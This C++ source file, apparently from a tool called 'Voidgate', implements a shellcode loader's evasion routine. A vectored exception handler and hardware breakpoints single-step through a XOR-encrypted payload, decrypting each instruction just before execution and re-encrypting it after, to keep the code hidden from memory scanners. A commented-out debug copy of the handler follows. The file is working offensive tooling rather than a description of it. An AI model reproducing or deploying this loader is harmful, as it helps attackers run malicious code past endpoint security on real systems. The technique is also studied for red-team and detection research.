#include "Voidgate.h"
#include "payload.h"


DWORD64 payload_base        = 0;    //Global var holding the base address of the payload (entrypoint).
DWORD64 payload_lower_bound = 0;    //Global var holding the LOWER BOUND of the payload (used to determine if the exception occurs in our payload).
DWORD64 payload_upper_bound = 0;    //Global var holding the UPPER BOUND of the payload (used to determine if the exception occurs in our payload).
DWORD64 last_decrypted_asm  = 0;    //Global var holding the address of the last decrypted ASM instruction. This is used to encrypt back the instruction at the next iteration.

LONG VehDecryptHeapAsm(EXCEPTION_POINTERS* ExceptionInfo) 
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        //If hardware breakpoint Dr0 is set, clear it
        if (ExceptionInfo->ContextRecord->Dr0)
        {
            ExceptionInfo->ContextRecord->Dr0 = 0;
        }

        //Set TRAP flag to generate next EXCEPTION_SINGLE_STEP
        ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

        //If shellcode is not in our bound, continue without encryption/decryption
        if (ExceptionInfo->ContextRecord->Rip < payload_lower_bound || ExceptionInfo->ContextRecord->Rip > payload_upper_bound)
        {
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        DWORD64 current_asm_addr = ExceptionInfo->ContextRecord->Rip;

        //If there was a previous decrypted ASM instruction,encrypt it back
        if (last_decrypted_asm)
        {
            DWORD key_index = GetXorKeyIndexForAsm(payload_base, last_decrypted_asm, key);

            PBYTE addr_last_decrypted_asm = (PBYTE)last_decrypted_asm;
            for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
            {
                if (key_index == key.size())
                {
                    key_index = 0;
                }
                addr_last_decrypted_asm[i] = addr_last_decrypted_asm[i] ^ key[key_index];
                key_index++;
            }
        }

        //Decrypt the current ASM instruction to prepare it for execution
        PBYTE current_asm = (PBYTE)current_asm_addr;
        DWORD keyIndex = GetXorKeyIndexForAsm(payload_base, current_asm_addr, key);
        for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
        {
            if (keyIndex == key.size())
            {
                keyIndex = 0;
            }
            current_asm[i] = current_asm[i] ^ key[keyIndex];
            keyIndex++;
        }

        //Save the last decrypted ASM address to encrypt it at the next iteration
        last_decrypted_asm = current_asm_addr;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }

}

BOOL SetHardwareBreakpoint(PVOID address_of_breakpoint) 
{

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE currentThread = GetCurrentThread();
    DWORD status = GetThreadContext(currentThread, &ctx);

    ctx.Dr0 = (UINT64)address_of_breakpoint;
    ctx.Dr7 |= (1 << 0);    //GLOBAL BREAKPOINT
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!SetThreadContext(currentThread, &ctx)) {
        return false;
    }

    return true;
}

DWORD GetXorKeyIndexForAsm(DWORD64 shellcode_base, DWORD64 current_asm_addr, std::string key)
{
    DWORD keySize = key.size();
    DWORD64 difference = current_asm_addr - shellcode_base;
    DWORD characterOffset = difference % (keySize);
    return characterOffset;
}

void LogWinapiError(std::string failedFunction)
{
    std::cout << "[X] ERROR - " << failedFunction << " failed with error code: " << GetLastError() << std::endl;
}


//LONG VehDecryptHeapAsm(EXCEPTION_POINTERS* ExceptionInfo) {
//    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
//    {
//        //If shellcode is not in our bound
//        if (ExceptionInfo->ContextRecord->Rip < payload_lower_bound || ExceptionInfo->ContextRecord->Rip > payload_upper_bound)
//        {
//            bitset(ExceptionInfo->ContextRecord->EFlags, 8);
//            return EXCEPTION_CONTINUE_EXECUTION;
//        }
//
//        DWORD64 current_asm_addr = ExceptionInfo->ContextRecord->Rip;
//
//        /*std::cout << "\n\n\n\n\n\n\n\n#################################################################\n";
//        std::cout << "[~] LOG - Breakpoint hit at 0x" << std::hex << current_asm_addr << "\n";*/
//
//        //Print all CPU registers:
//        /*std::cout << "    [+] CPU REGISTERS:\n";
//        std::cout << "        _______________________\n";
//        printf("       |RAX = %016llx|\n", ExceptionInfo->ContextRecord->Rax);
//        printf("       |RBX = %016llx|\n", ExceptionInfo->ContextRecord->Rbx);
//        printf("       |RCX = %016llx|\n", ExceptionInfo->ContextRecord->Rcx);
//        printf("       |RDX = %016llx|\n", ExceptionInfo->ContextRecord->Rdx);
//        printf("       |RSP = %016llx|\n", ExceptionInfo->ContextRecord->Rsp);
//        printf("       |RBP = %016llx|\n", ExceptionInfo->ContextRecord->Rbp);
//        printf("       |RSI = %016llx|\n", ExceptionInfo->ContextRecord->Rsi);
//        printf("       |RDI = %016llx|\n", ExceptionInfo->ContextRecord->Rdi);
//        printf("       |RIP = %016llx|\n", ExceptionInfo->ContextRecord->Rip);
//        printf("       |R8  = %016llx|\n", ExceptionInfo->ContextRecord->R8);
//        printf("       |R9  = %016llx|\n", ExceptionInfo->ContextRecord->R9);
//        printf("       |R10 = %016llx|\n", ExceptionInfo->ContextRecord->R10);
//        printf("       |R11 = %016llx|\n", ExceptionInfo->ContextRecord->R11);
//        printf("       |R12 = %016llx|\n", ExceptionInfo->ContextRecord->R12);
//        printf("       |R13 = %016llx|\n", ExceptionInfo->ContextRecord->R13);
//        printf("       |R14 = %016llx|\n", ExceptionInfo->ContextRecord->R14);
//        printf("       |R15 = %016llx|\n", ExceptionInfo->ContextRecord->R15);
//        std::cout << "       ````````````````````````\n";*/
//
//        //If hardware breakpoint Dr0 is set, clear it
//        if (ExceptionInfo->ContextRecord->Dr0)
//        {
//            ExceptionInfo->ContextRecord->Dr0 = 0;
//        }
//
//        //Set TRAP flag for single step
//        //ExceptionInfo->ContextRecord->EFlags |= (1 << 8);
//        bitset(ExceptionInfo->ContextRecord->EFlags, 8);
//
//        //Re-encrypt the last decrypted ASM instruction
//        if (last_decrypted_asm)
//        {
//            //std::cout << "#########################" << std::endl;
//            //std::cout << "### ENCRYPTING OLD ASM ##" << std::endl;
//            //std::cout << "#########################" << std::endl;
//
//            DWORD key_index = GetXorKeyIndexForAsm(payload_base, last_decrypted_asm, key);
//            //std::cout << "    XOR KEY START INDEX: " << keyIndex << std::endl;
//            PBYTE addr_last_decrypted_asm = (PBYTE)last_decrypted_asm;
//            for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
//            {
//                if (key_index == key.size())
//                {
//                    key_index = 0;
//                }
//                addr_last_decrypted_asm[i] = addr_last_decrypted_asm[i] ^ key[key_index];
//                //std::cout << "        ROUND " << i << " XOR KEY CHAR: " << key[keyIndex] << " WITH INDEX" << keyIndex << std::endl;
//                key_index++;
//            }
//        }
//
//        /* std::cout << "[~] LOG - Checking if current XOR encrypted heap is equal with the original encrypted payload..." << std::endl;
//         DWORD check = memcmp((PBYTE)original_shellcode, (PBYTE)shellcode_base, shellcode_size);
//         if (check!=0)
//         {
//             std::cout << "    [!] WARNING - Memory is not the same! Encryption/Decryption gone wrong!" << std::endl;
//         }
//         else
//         {
//             std::cout << "    [+] OK - Memory is identical!" << std::endl << std::endl;
//         }*/
//
//         //Decrypt the current ASM instruction
//         //std::cout << "\n\n#############################" << std::endl;
//         //std::cout << "### DECRYPTING CURRENT ASM ##" << std::endl;
//         //std::cout << "#############################" << std::endl;
//        PBYTE current_asm = (PBYTE)current_asm_addr;
//        DWORD keyIndex = GetXorKeyIndexForAsm(payload_base, current_asm_addr, key);
//        for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++)
//        {
//            if (keyIndex == key.size())
//            {
//                keyIndex = 0;
//            }
//            current_asm[i] = current_asm[i] ^ key[keyIndex];
//            //std::cout << "        ROUND " << i << " XOR KEY CHAR: " << key[keyIndex] << " WITH INDEX" << keyIndex << std::endl;
//            keyIndex++;
//        }
//
//
//        last_decrypted_asm = current_asm_addr;
//        /*DWORD64 asm_offset_from_base = DWORD64(current_asm - shellcode_base);
//        std::cout << "[~] LOG - EXCEPTION_CONTINUE_EXECUTION at offset 0x"  << asm_offset_from_base << std::endl;
//        std::cout << "    [+] - Printing decrypted ASM: ";
//        for (INT j = 0; j < MAX_X64_ASM_OPCODE_LEN; j++)
//        {
//
//            BYTE asm_byte = *(current_asm + j);
//            DWORD decrypted_asm_byte = 0;
//            decrypted_asm_byte |= (DWORD)asm_byte;
//            std::cout << " " << std::hex << decrypted_asm_byte;
//        }
//        std::cout << std::endl;*/
//
//        /*if (asm_offset_from_base == 0xb1)
//        {
//            breakpoint_hit = true;
//        }
//        if (breakpoint_hit)
//        {
//            system("pause");
//        }*/
//        return EXCEPTION_CONTINUE_EXECUTION;
//    }
//    else
//    {
//        return EXCEPTION_CONTINUE_SEARCH;
//    }
//
//}